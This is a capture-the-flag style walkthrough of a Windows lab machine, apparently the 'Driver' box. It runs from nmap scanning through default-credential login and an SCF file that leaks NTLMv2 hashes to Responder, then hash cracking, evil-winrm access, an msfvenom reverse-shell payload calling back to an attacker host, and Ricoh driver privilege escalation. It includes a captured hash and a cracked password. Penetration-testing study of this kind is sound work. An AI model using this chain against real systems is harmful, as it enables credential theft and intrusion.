# nmap 

```shell
map -sC -sV -Pn -oN nmap/driver $IP -T5 --min-rate=1000

Nmap scan report for 10.129.95.238
Host is up (0.24s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open winrm
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
| smb2-time: 
|   date: 2024-10-15T20:53:08
|_  start_date: 2024-10-15T20:48:35
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

# web server requires login credentials
![[Pasted image 20241015223119.png]]

> tried admin:admin and got an access to the site

# Uploaded a scf file on to the smb share using the http server, hosted responder, then captured the  hashed credentials of the user that handles the smb share
# responder.py
```shell
sudo responder.py -I tun0
```
# scf file 
 ```powershell
 [Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
 
```
# user credentials

```powershell
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:ee18f04552ec45b6:DD6442FEC8C664AF697EC67D6F91D9FE:010100000000000080286782B21FDB01F2978CFDD644029C00000000020008004E0046005200450001001E00570049004E002D004F00580056004F003200550032004E0039003900480004003400570049004E002D004F00580056004F003200550032004E003900390048002E004E004600520045002E004C004F00430041004C00030014004E004600520045002E004C004F00430041004C00050014004E004600520045002E004C004F00430041004C000700080080286782B21FDB0106000400020000000800300030000000000000000000000000200000C03708B368331E6016F1393A39C51BC4F6AB706D79CD4A0A70F2D35249447F140A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0038003400000000000000000000000000

```

# cracked the hash using hashcat 

```shell
hashcat -m 5600 -a 0 pass.txt rockyou.txt
```


# used the credentials to connect to the machine using evil-winrm

```shell
evil-winrm -i <IP> -u tony -p 'liltony'
```


# executed winpeas, found  RICOH PCL6 UniversalDriver V4.23, the app has a [CVE-2019-19363](https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) 

```powershell
  C:\Users\All Users\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common
     C:\Users\All Users\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23
     C:\Users\All Users\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\do_not_delete_folders

```

# created and uploaded a msfvenom payload reverse shell that connects to a meterpreter listener exploit/multi/handler module

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.84 LPORT=4444 -f exe > rev.exe
```

# Ensure the payload on the module exploit/multi/handler is same from msfvenom payload then I used local_exploit_suggester, found the CVE on the result

```shell
 8   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ricoh_driver_privesc                     Yes                      The target appears to be vulnerable. Ricoh driver directory has full permissions
 11  exploit/windows/local/tokenmagic                               Yes             
```

# Encountered an error after running the module  exploit/windows/local/ricoh_driver_privesc , had to migrate a process on the machine to enable the exploit, gained shell